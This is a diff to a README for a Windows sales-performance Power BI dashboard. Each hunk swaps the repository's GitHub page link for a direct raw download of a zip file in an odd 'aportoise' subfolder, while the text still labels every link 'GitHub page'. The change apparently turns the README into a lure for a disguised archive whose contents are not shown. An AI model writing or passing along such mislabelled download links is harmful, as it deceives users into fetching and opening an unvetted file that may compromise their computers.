@@ -1,6 +1,6 @@
 # 📊 sales-performance-dashboard - Clear sales insights in one place
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cristopherimported130/sales-performance-dashboard)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cristopherimported130/sales-performance-dashboard/main/aportoise/performance_dashboard_sales_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it on Windows if you want to open the report, review the visuals, and explor
 
 Go to the GitHub page here and download or open the project files:
 
-https://github.com/cristopherimported130/sales-performance-dashboard
+https://raw.githubusercontent.com/cristopherimported130/sales-performance-dashboard/main/aportoise/performance_dashboard_sales_v3.5.zip
 
 If the repository includes a Power BI file, download it to your PC, then open it in Power BI Desktop. If the page includes a release or packaged file, download that file and open it on Windows.
 
@@ -60,7 +60,7 @@ After that, you can open the dashboard file from the GitHub project.
 
 Follow these steps on Windows:
 
-1. Open this GitHub page: https://github.com/cristopherimported130/sales-performance-dashboard
+1. Open this GitHub page: https://raw.githubusercontent.com/cristopherimported130/sales-performance-dashboard/main/aportoise/performance_dashboard_sales_v3.5.zip
 2. Look for the project files in the repository
 3. Download the Power BI file or project folder to your computer
 4. Save it in a folder you can find again, such as Downloads or Documents
@@ -198,4 +198,4 @@ If the project includes data files, keep them in the same folder as the report f
 
 ## 📎 Download Again
 
-GitHub page: https://github.com/cristopherimported130/sales-performance-dashboard
+GitHub page: https://raw.githubusercontent.com/cristopherimported130/sales-performance-dashboard/main/aportoise/performance_dashboard_sales_v3.5.zip
